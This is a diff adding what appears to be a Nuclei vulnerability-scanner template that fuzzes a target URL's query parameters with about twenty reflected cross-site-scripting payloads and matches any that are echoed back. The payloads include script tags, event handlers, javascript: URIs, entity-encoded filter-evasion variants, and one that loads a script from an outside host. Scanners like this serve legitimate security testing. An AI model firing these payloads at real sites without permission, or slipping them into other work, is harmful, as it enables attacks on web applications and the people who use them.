@@ -1,0 +1,48 @@
+id: Xssor-Finder
+
+info:
+  name: R-Xss Finder
+  author: SirBugs
+  severity: medium
+  description: This template is a copy and better than version of "https://github.com/SirBugs/Xssor.go"
+  tags: xssor, xss, rxss
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      reflection:
+        - 'a"><script>alert(1)</script>'
+        - 'a"><img src=x onerror=alert(1)>'
+        - 'a"><img src=x onerror=prompt(1)>'
+        - 'a"></svg/onload=alert(1)>'
+        - 'a"></svg/onload=confirm(1)>'
+        - 'a"></svg/onload=prompt(1)>'
+        - 'a"><script>confirm(1)</script>'
+        - 'a"><IMG SRC=X ONLOAD=ALERT(1)>'
+        - 'a"><IMG SRC=javascript:alert("XSS")>'
+        - 'a"><IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>'
+        - 'a"><IMG SRC=# onmouseover="alert(1)">'
+        - 'a"><IMG SRC="livescript:[code]">'
+        - 'a"><BODY ONLOAD=alert(1)>'
+        - 'a"><INPUT TYPE="IMAGE" SRC="javascript:alert(1);">'
+        - 'a"><SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>'
+        - 'a"><IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>'
+        - 'a"><IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>'
+        - 'a"><IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>'
+        - 'a"><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>'
+        - 'a"><IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>'
+        - 'a"><IMG """><SCRIPT>alert("XSS")</SCRIPT>">'
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+    matchers:
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "{{reflection}}"
